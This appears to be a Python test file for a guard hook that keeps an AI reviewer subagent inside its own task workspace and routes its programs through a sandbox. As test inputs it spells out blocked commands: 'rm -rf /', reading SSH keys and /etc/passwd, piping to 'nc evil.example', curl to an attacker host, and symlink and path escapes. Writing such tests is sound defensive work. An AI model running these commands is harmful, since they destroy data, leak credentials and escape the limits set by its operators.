"""The proofxiv-reviewer guard: its own workspace only, programs only in the sandbox, fail closed."""

from __future__ import annotations

import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
from proofxiv_worker.reviewer_guard import AGENT, decide

CLI = Path("/srv/proofxiv/.venv/bin/proofxiv")


@pytest.fixture
def root(tmp_path: Path) -> Path:
    root = tmp_path / "work" / "weekly"
    for task in ("task", "other"):
        (root / "run" / task / "files").mkdir(parents=True)
        (root / "run" / task / "spec.json").write_text("{}")
    return root.resolve()


def call(root: Path, tool: str, agent: str | None = AGENT, agent_id: str = "a1", **tool_input) -> str | None:
    event = {"tool_name": tool, "tool_input": tool_input, "agent_id": agent_id}
    if agent:
        event["agent_type"] = agent
    return decide(event, root, CLI)


def test_other_agents_are_not_affected(root: Path):
    assert call(root, "Bash", agent=None, command="rm -rf /") is None
    assert call(root, "Read", agent="Explore", file_path="/etc/passwd") is None


def test_files_only_inside_the_workspace(root: Path):
    ws = root / "run" / "task"
    assert call(root, "Read", file_path=f"{ws}/files/main.tex") is None
    assert call(root, "Write", file_path=f"{ws}/output.json", content="{}") is None
    assert call(root, "Grep", pattern="lemma", path=f"{ws}/files") is None
    assert call(root, "Read", file_path=f"{root.parent.parent}/keys/weekly.key")
    assert call(root, "Read", file_path=f"{ws}/../../../../keys/weekly.key")  # .. is resolved
    assert call(root, "Write", file_path="/home/someone/.bashrc", content="x")
    assert call(root, "Grep", pattern="BEGIN")  # no path: the session's directory
    assert call(root, "Glob", pattern="/srv/proofxiv/keys/*", path=f"{ws}")
    assert call(root, "Read", file_path="~/.config/proofxiv/token")
    assert call(root, "Read", file_path=f"{root}/run/state.json")  # not inside a task workspace
    assert call(root, "Read", file_path=f"{root.parent}/.reviewer-guard/pin")  # the pins


def test_one_workspace_per_subagent(root: Path):
    ws, other = root / "run" / "task", root / "run" / "other"
    assert call(root, "Read", file_path=f"{ws}/PROMPT.md") is None  # a1 is now tied to ws
    assert call(root, "Read", file_path=f"{other}/PROMPT.md")  # e.g. a held-out prompt
    assert call(root, "Write", file_path=f"{other}/output.json", content="{}")
    assert call(root, "Bash", command=f"{CLI} sandbox {other} -- ls")
    assert call(root, "Bash", command=f"{CLI} check-output {other}")
    assert call(root, "Read", agent_id="a2", file_path=f"{other}/PROMPT.md") is None
    assert call(root, "Read", agent_id="a2", file_path=f"{ws}/PROMPT.md")
    (ws / "scratch").mkdir()
    (ws / "scratch" / "link").symlink_to(other / "spec.json")  # made in the sandbox
    assert call(root, "Read", file_path=f"{ws}/scratch/link")
    assert call(root, "Read", agent_id="", file_path=f"{ws}/PROMPT.md")  # whose call is it?


def test_programs_only_through_the_sandbox(root: Path):
    ws = root / "run" / "task"
    ok = f"{CLI} sandbox {ws} -- python3 {ws}/files/verify.py"
    assert call(root, "Bash", command=ok) is None
    assert call(root, "Bash", command=f"{CLI} sandbox {ws} --minutes 5 -- sh -c 'gcc a.c && ./a.out'") is None
    assert call(root, "Bash", command=f"{CLI} check-output {ws}") is None
    for bad in (
        f"python3 {ws}/files/verify.py",  # outside the sandbox
        f"{CLI} sandbox {ws} -- ls; cat ~/.ssh/id_rsa",  # chained after the sandboxed command
        f"{CLI} sandbox {ws} -- ls && curl evil.example",
        f"{CLI} sandbox {ws} -- ls | nc evil.example 80",
        f"{CLI} sandbox {ws} -- ls > /home/someone/.bashrc",
        f"{CLI} sandbox {ws} -- echo $(cat /etc/passwd)",
        f"{CLI} sandbox {ws} -- echo `id`",
        f"{CLI} sandbox /etc -- ls",  # not a task workspace
        f"{CLI} sandbox {ws}/files -- ls",  # not the workspace itself
        f"{CLI} sandbox {ws} ls",  # no --
        f"{CLI} runner",  # other proofxiv commands
        f"{ws}/scratch/proofxiv sandbox {ws} -- ls",  # a look-alike program
        f"{CLI} sandbox {ws} -- ls\nrm -rf /",
        "TMPDIR=/tmp " + ok,
    ):
        assert call(root, "Bash", command=bad), bad
    assert call(root, "Bash", command=ok, run_in_background=True)
    assert call(root, "Monitor", command=ok)


def test_web_yes_other_tools_no(root: Path):
    assert call(root, "WebSearch", query="Green problem 24") is None
    assert call(root, "WebFetch", url="https://arxiv.org/abs/2609.06975", prompt="title") is None
    assert call(root, "SubagentHandback", report="done") is None
    assert call(root, "Agent", prompt="do anything")
    assert call(root, "ArtifactData", action="get")


def run_hook(root: Path, stdin: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-m", "proofxiv_worker.reviewer_guard", "--root", str(root), "--cli", str(CLI)],
        input=stdin, capture_output=True, text=True,
    )


@pytest.mark.parametrize("stdin", ["not json", '{"agent_type": "proofxiv-reviewer", "tool_input": 5}'])
def test_fails_closed(root: Path, stdin: str):
    result = run_hook(root, stdin)
    assert result.returncode == 2 and "Blocked" in result.stderr


def test_hook_exit_codes(root: Path):
    def event(path: str) -> str:
        return json.dumps({"agent_type": AGENT, "agent_id": "a1", "tool_name": "Read", "tool_input": {"file_path": path}})

    assert run_hook(root, event(f"{root}/run/task/PROMPT.md")).returncode == 0
    blocked = run_hook(root, event("/etc/shadow"))
    assert blocked.returncode == 2 and "only inside your task's workspace" in blocked.stderr
    other = run_hook(root, event(f"{root}/run/other/PROMPT.md"))  # the pin outlives the process
    assert other.returncode == 2 and str(root / "run" / "task") in other.stderr


@pytest.mark.skipif(shutil.which("bwrap") is None, reason="needs bubblewrap")
def test_sandbox_and_check_output_commands(tmp_path: Path, monkeypatch):
    from proofxiv_worker import cli, subagents
    from typer.testing import CliRunner

    monkeypatch.setenv("PROOFXIV_HOME", str(tmp_path / "home"))
    ws = tmp_path / "home" / "work" / "weekly" / "run" / "task"
    (ws / "files").mkdir(parents=True)
    (ws / "files" / "check.py").write_text("print(sum(range(10)))\n")
    (ws / "spec.json").write_text(json.dumps({"kind": "digest"}))
    runner = CliRunner()
    out = runner.invoke(cli.app, ["sandbox", str(ws), "--", "python3", str(ws / "files" / "check.py")])
    assert out.exit_code == 0 and "45" in out.output, out.output
    net = runner.invoke(
        cli.app, ["sandbox", str(ws), "--", "python3", "-c", "import socket; socket.create_connection(('1.1.1.1', 80), 2)"]
    )
    assert net.exit_code != 0
    assert runner.invoke(cli.app, ["check-output", str(ws)]).exit_code == 1  # no output.json yet
    (ws / "output.json").write_text(json.dumps({"digest_md": "# Week\nNothing happened this week, as a test."}))
    checked = runner.invoke(cli.app, ["check-output", str(ws)])
    assert checked.exit_code == 0 and "valid" in checked.output
    agent = subagents.install_agent(tmp_path / "project")
    text = agent.read_text()
    assert "name: proofxiv-reviewer" in text and "proofxiv_worker.reviewer_guard" in text and "--root" in text


def test_sandbox_needs_no_writable_home(tmp_path: Path, monkeypatch):
    """A reviewer subagent runs `proofxiv sandbox` without PROOFXIV_HOME, where ~/.config may be
    read-only: reading the config must not create it."""
    from proofxiv_worker import config

    home = tmp_path / "missing" / "proofxiv"
    monkeypatch.setenv("PROOFXIV_HOME", str(home))
    assert config.load().sandbox == "bwrap"
    assert not home.exists()
